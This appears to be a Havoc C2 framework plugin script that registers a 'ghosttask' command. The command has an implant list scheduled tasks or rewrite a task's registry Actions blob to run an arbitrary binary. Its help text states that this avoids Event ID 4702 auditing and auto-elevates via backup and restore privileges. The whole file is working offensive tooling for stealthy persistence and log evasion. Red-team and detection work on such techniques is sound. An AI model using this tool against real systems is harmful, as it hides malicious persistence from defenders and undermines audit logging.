from havoc import Demon, RegisterCommand, RegisterModule


def ghosttask(demonID, *params):
    demon = Demon(demonID)

    if len(params) == 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage:\n"
            "  ghosttask --show                              (list all scheduled tasks)\n"
            "  ghosttask <task_name> <target_binary>         (redirect a task)\n"
            "\n"
            "  Modifying the Actions blob directly avoids Event ID 4702.\n"
            "  Requires SYSTEM, or Administrator (auto-elevates via\n"
            "  SeBackupPrivilege + SeRestorePrivilege + REG_OPTION_BACKUP_RESTORE).")
        return False

    first = params[0].lower()
    packer = Packer()

    if first in ("--show", "--showtasks", "-s", "list", "--list"):
        packer.addint(0)
        TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
            "Tasked demon to enumerate scheduled tasks from registry")
    elif len(params) >= 2:
        task_name     = params[0]
        target_binary = params[1]
        packer.addint(1)
        packer.addstr(task_name)
        packer.addstr(target_binary)
        TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
            f"Tasked demon to ghost task '{task_name}' -> {target_binary}")
    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: ghosttask --show | ghosttask <task_name> <target_binary>")
        return False

    demon.InlineExecute(TaskID, "go", "bin/ghosttask.x64.o", packer.getbuffer(), False)
    return TaskID


RegisterCommand(
    ghosttask,
    "",
    "ghosttask",
    "Modify a scheduled task's Actions via registry, bypassing Event ID 4702 (SYSTEM or Admin)",
    0,
    "--show | <task_name> <target_binary>",
    "\\Microsoft\\Windows\\Bluetooth\\UninstallDeviceTask C:\\Windows\\System32\\calc.exe"
)
